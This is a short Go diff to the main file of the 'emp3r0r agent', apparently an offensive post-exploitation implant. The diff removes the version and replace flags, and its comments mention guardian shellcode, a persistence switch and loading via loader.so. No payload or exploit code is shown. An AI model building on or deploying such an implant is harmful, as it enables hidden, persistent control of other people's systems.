@@ -2,7 +2,6 @@ package main
 
 import (
 	"context"
-	"flag"
 	"fmt"
 	"io"
 	"log"
@@ -30,10 +29,7 @@ import (
 
 func main() {
 	var err error
-	replace := flag.Bool("replace", false, "Replace existing agent process")
-	replace_agent := *replace // make it mutable
-	version := flag.Bool("version", false, "Show version info")
-	flag.Parse()
+	replace_agent := false
 
 	// check if this process is invoked by guardian shellcode
 	// by checking if process executable is same as parent's
@@ -49,13 +45,6 @@ func main() {
 	persistent := os.Getenv("PERSISTENCE") == "true"
 	// are we running from loader.so?
 	run_from_loader := os.Getenv("LD") == "true"
-
-	// version
-	if *version {
-		fmt.Printf("emp3r0r agent (%s)\n", emp3r0r_data.Version)
-
-		return
-	}
 
 	// verbose
 	if verbose {
